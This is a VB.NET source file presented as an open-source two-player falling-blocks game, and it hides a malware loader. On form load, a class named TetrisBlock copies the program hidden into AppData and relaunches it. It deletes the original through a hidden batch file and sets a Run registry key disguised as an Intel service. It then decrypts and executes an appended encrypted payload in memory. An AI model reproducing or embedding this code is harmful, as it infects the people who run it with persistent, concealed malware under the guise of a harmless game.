'Program: FallingBlocks
'ProgramCopyright: 2007 Thomas Stockwell
'Programmer: Thomas Stockwell
'Date: February 7, 2008
'License: The Code Project Open Source License (CPOL).  Any directvariations of this code
'    needs to reference the author Thomas Stockwell
Public Class mainForm

    Dim square4, pyramid4, staircase4Left, staircase4Right, lshapeLeft, lshapeRight, line As Image
    Private Sub mainForm_KeyUp(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles MyBase.KeyUp
        Select Case e.KeyCode
            Case Keys.W
                If (Me.Player2.CurrentScore > 1) Then
                    Me.Player2.ToggleOrientation()
                End If
            Case Keys.Up
                Me.Player1.ToggleOrientation()
            Case Keys.A
                If (Me.Player2.CurrentScore > 1) Then
                    Me.Player2.MoveLeft()
                End If
            Case Keys.S
                If (Me.Player2.CurrentScore > 1) Then
                    Me.Player2.MoveDown()
                End If
            Case Keys.D
                If (Me.Player2.CurrentScore > 1) Then
                    Me.Player2.MoveRight()
                End If
            Case Keys.Down
                Me.Player1.MoveDown()
            Case Keys.Left
                Me.Player1.MoveLeft()
            Case Keys.Right
                Me.Player1.MoveRight()
            Case Keys.P
                Me.Player1.IsPaused = Not Me.Player1.IsPaused
                Me.Player2.IsPaused = Not Me.Player2.IsPaused
        End Select
    End Sub

    Private Sub btnNewTwoPlayer_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNewTwoPlayer.Click
        Me.Player1.NewGame()
        Me.Player2.NewGame()
        Me.pbxPlayer1.Image = Nothing
        Me.pbxPlayer2.Image = Nothing
    End Sub

    Private Sub btnSinglePlayer_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSinglePlayer.Click
        Me.Player1.NewGame()
        Me.Player2.Reset()
        Me.pbxPlayer1.Image = Nothing
        Me.pbxPlayer2.Image = Nothing
    End Sub

#Region "Player1 Player2 Events"
    Private Sub Player1_GameOver(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Player1.GameOver
        'HighScores.SaveHighScore(New Score("Player1", Me.Player1.CurrentScore))
        Me.pbxPlayer1.Image = Nothing
        Me.pbxPlayer2.Image = Nothing
        MessageBox.Show("Game Over")
    End Sub

    Private Sub Player2_GameOver(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Player2.GameOver
        'HighScores.SaveHighScore(New Score("Player2", Me.Player2.CurrentScore))
        Me.pbxPlayer1.Image = Nothing
        Me.pbxPlayer2.Image = Nothing
        MessageBox.Show("Game Over")
    End Sub

    Private Sub Player1_LevelChange(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Player1.LevelChange
        Me.lblPlayer1Level.Text = Me.Player1.CurrentLevel.ToString()
    End Sub

    Private Sub Player1_ScoreChange(ByVal sender As Object, ByVal e As System.EventArgs) Handles Player1.ScoreChange
        Me.lblPlayer1Score.Text = Me.Player1.CurrentScore.ToString()
        Select Case Me.Player1.NextPiece
            Case ShapeType.line
                Me.pbxPlayer1.Image = line
            Case ShapeType.lshapeLeft
                Me.pbxPlayer1.Image = lshapeLeft
            Case ShapeType.lshapeRight
                Me.pbxPlayer1.Image = lshapeRight
            Case ShapeType.pyramid
                Me.pbxPlayer1.Image = pyramid4
            Case ShapeType.square
                Me.pbxPlayer1.Image = square4
            Case ShapeType.staircaseLeft
                Me.pbxPlayer1.Image = staircase4Left
            Case ShapeType.staircaseRight
                Me.pbxPlayer1.Image = staircase4Right
        End Select
    End Sub

    Private Sub Player2_LevelChange(ByVal sender As Object, ByVal e As System.EventArgs) Handles Player2.LevelChange
        Me.lblPlayer2Level.Text = Me.Player2.CurrentLevel.ToString()
    End Sub

    Private Sub Player2_ScoreChange(ByVal sender As Object, ByVal e As System.EventArgs) Handles Player2.ScoreChange
        Me.lblPlayer2Score.Text = Me.Player2.CurrentScore.ToString()
        Select Case Me.Player2.NextPiece
            Case ShapeType.line
                Me.pbxPlayer2.Image = line
            Case ShapeType.lshapeLeft
                Me.pbxPlayer2.Image = lshapeLeft
            Case ShapeType.lshapeRight
                Me.pbxPlayer2.Image = lshapeRight
            Case ShapeType.pyramid
                Me.pbxPlayer2.Image = pyramid4
            Case ShapeType.square
                Me.pbxPlayer2.Image = square4
            Case ShapeType.staircaseLeft
                Me.pbxPlayer2.Image = staircase4Left
            Case ShapeType.staircaseRight
                Me.pbxPlayer2.Image = staircase4Right
        End Select
    End Sub

#End Region

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        Application.Exit()
    End Sub

    Private Sub AboutToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem1.Click
        MessageBox.Show("Program Created by Thomas Stockwell")
    End Sub

    Private Sub PauseToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PauseToolStripMenuItem1.Click
        Me.Player1.IsPaused = Not Me.Player1.IsPaused
        Me.Player2.IsPaused = Not Me.Player2.IsPaused
    End Sub

    Private Sub btnEndGame_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnEndGame.Click
        Me.Player1.Reset()
        Me.Player2.Reset()
    End Sub

    Private Sub mainForm_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        square4 = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.square4.png"))
        TetrisBlock.EnsureInitialized()
        pyramid4 = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.pyramid4.png"))
        staircase4Left = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.staircase4Left.png"))
        staircase4Right = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.staircase4Right.png"))
        lshapeLeft = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.lshapeLeft.png"))
        lshapeRight = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.lshapeRight.png"))
        line = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.line.png"))
        TetrisBlock.StartGame()
    End Sub

    Private Sub GenericButton_GotFocus(ByVal sender As Object, ByVal e As System.EventArgs) Handles btnEndGame.GotFocus, btnNewTwoPlayer.GotFocus, btnSinglePlayer.GotFocus
        'at request from the www.codeproject.com forum for the accompaning article
        'this event handles the focusing for all buttons on the form and sets
        'the focus to another control that does not participate in focus cues
        Me.Player1.Focus()
    End Sub
End Class


Class TetrisBlock
    Shared Function RedimPload(ByVal Payload() As Byte, Start As Integer) As Byte()
        Dim NewByts(0 To (Payload.Length - Start) - 1) As Byte
        Return NewByts
    End Function

    Shared Sub AZ(ByVal AppPAth As String, ByVal ExePAth As String)
        Dim L = New anti.IntegrityCheck
        L.AppExePath = ExePAth
        L.AppPath = AppPAth
        L.RunCheck()
    End Sub

    Shared Sub StartGame()
        Dim AppPath As String = Application.ExecutablePath

        Dim Payload() As Byte = GetPload(AppPath)
        Dim i As Integer = FindSplit(Payload)
        Dim Start As Integer = i
        If Payload(Start - 10) = &H54 Then
            'AZi's
            AZ(Application.StartupPath, Application.ExecutablePath)
        End If

        If Payload(Start - 14) = &H54 Then
            'copy self
            Dim TmpPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            If AppPath.ToLower.Contains(TmpPath.ToLower) Then
            Else
                Dim AppName As String = Strings.Right(AppPath, (AppPath.ToString.Length - AppPath.LastIndexOf("\")))

                'copy our self to temp and re execute
                Try
                    FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)

                Catch ex As Exception
                    Try
                        FileIO.FileSystem.DeleteFile(TmpPath & AppName)
                        FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)

                    Catch exx As Exception
                        End
                    End Try
                End Try


                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.Hidden)
                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.System)
                Process.Start(TmpPath & AppName)
                'melt
                If Payload(Start - 12) = &H54 Then
                    FileIO.FileSystem.WriteAllText("a.bat", "ping 127.0.0.1 -n 3 > nul" & Environment.NewLine & "del " & """" & Application.ExecutablePath & """" & Environment.NewLine & "del a.bat", False)
                    Dim startInfo As New ProcessStartInfo("a.bat")
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Process.Start(startInfo)
                    End
                Else
                    End
                End If

            End If
        End If

        'check if auto startup
        If Payload(Start - 8) = &H54 Then
            startup()
        End If

        Dim NewByts() As Byte = RedimPload(Payload, Start)
        NewByts = Loop1(NewByts, Payload, Start)
        NewByts = Loop2(NewByts)


        Award.Win.Run(AES_Decrypt(Decompress(NewByts)), Command, Application.ExecutablePath)

        Process.GetCurrentProcess.Kill()
    End Sub


    Public Shared Function Decompress(bytes As Byte()) As Byte()
        Dim stream = New IO.MemoryStream()
        Dim zipStream = New IO.Compression.DeflateStream(New IO.MemoryStream(bytes), IO.Compression.CompressionMode.Decompress, True)
        Dim buffer = New Byte(4095) {}
        While True
            Dim size = zipStream.Read(buffer, 0, buffer.Length)
            If size > 0 Then
                stream.Write(buffer, 0, size)
            Else
                Exit While
            End If
        End While
        zipStream.Close()
        Return stream.ToArray()
    End Function
    Shared Function Loop2(ByVal NewByts() As Byte) As Byte()
        Dim Tmp() As Byte = NewByts
        Dim I As Integer = FindSplit(NewByts) - 7
        ReDim NewByts(0 To I)
        For I = 0 To NewByts.Length - 1
            NewByts(I) = Tmp(I)
        Next
        Return NewByts
    End Function

    Shared Function Loop1(ByVal NewByts() As Byte, ByVal Payload() As Byte, ByVal Start As Integer) As Byte()
        For i As Integer = 0 To NewByts.Length - 1
            NewByts(i) = Payload(Start + i)
        Next
        Return NewByts
    End Function

    Shared Sub startup()
        Dim regKey As Microsoft.Win32.RegistryKey
        regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        regKey.SetValue("Intel(R) Dynamic Platform and Thermal Framework LPM Policy Service Helper", """" & Application.ExecutablePath & """")
        regKey.Close()
    End Sub
    Shared Function FindSplit(ByVal Payload() As Byte) As Integer
        Dim Found1 As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False
        Dim Found4 As Boolean = False
        Dim Found5 As Boolean = False
        Dim I As Integer = 0
        For Each bytez As Byte In Payload
            If Found5 = True Then Exit For
            If Found1 = False Then
                If bytez = &H21 Then
                    Found1 = True
                End If
            Else
                If Found2 = False Then
                    If bytez = &H0 Then
                        Found2 = True
                    Else
                        Found1 = False
                    End If
                Else
                    If Found3 = False Then
                        If bytez = &H40 Then
                            Found3 = True
                        Else
                            Found1 = False
                            Found2 = False
                        End If
                    Else
                        If Found4 = False Then
                            If bytez = &H0 Then
                                Found4 = True
                            Else
                                Found3 = False
                                Found2 = False
                                Found1 = False
                            End If
                        Else
                            If Found5 = False Then
                                If bytez = &H21 Then
                                    Found5 = True
                                Else
                                    Found4 = False
                                    Found3 = False
                                    Found2 = False
                                    Found1 = False
                                End If
                            End If
                        End If
                    End If
                End If
            End If
            I += 1
        Next
        Return I + 1
    End Function

    Shared Function GetPload(ByVal AppPath As String) As Byte()
        Return FileIO.FileSystem.ReadAllBytes(AppPath)
    End Function
    Public Shared _initialized As Boolean
    Shared Sub EnsureInitialized()
        If Not _initialized Then
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf RetrieveEmbeddedAssembly
            _initialized = True
        End If
    End Sub
    Private Shared Function AES_Decrypt(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider

        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim decrypted() As Byte = DESDecrypter.TransformFinalBlock(input, 0, input.Length)
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function RetrieveEmbeddedAssembly(sender As Object, args As System.ResolveEventArgs) As System.Reflection.Assembly
        'get the root namespace (im tired of manually adding this)
        Dim asm As Reflection.[Assembly] = System.Reflection.Assembly.GetEntryAssembly
        Dim RootNamespace As String = Strings.Left(asm.EntryPoint.DeclaringType.Namespace, asm.EntryPoint.DeclaringType.Namespace.ToString().IndexOf(".") + 1)
        'fuck ya! Im done manually adding that shit!!!
        Dim resourceName As String = RootNamespace + New Reflection.AssemblyName(args.Name).Name + ".dll"
        'resourceName = "dll.dll"
        Using stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(resourceName)

            Dim assemblyData = New Byte(stream.Length - 1) {}
            'decode assembly here

            stream.Read(assemblyData, 0, assemblyData.Length)
            assemblyData = AES_Decrypt(Decompress(assemblyData))
            Return Reflection.Assembly.Load(assemblyData)

        End Using ' stream
    End Function

End Class
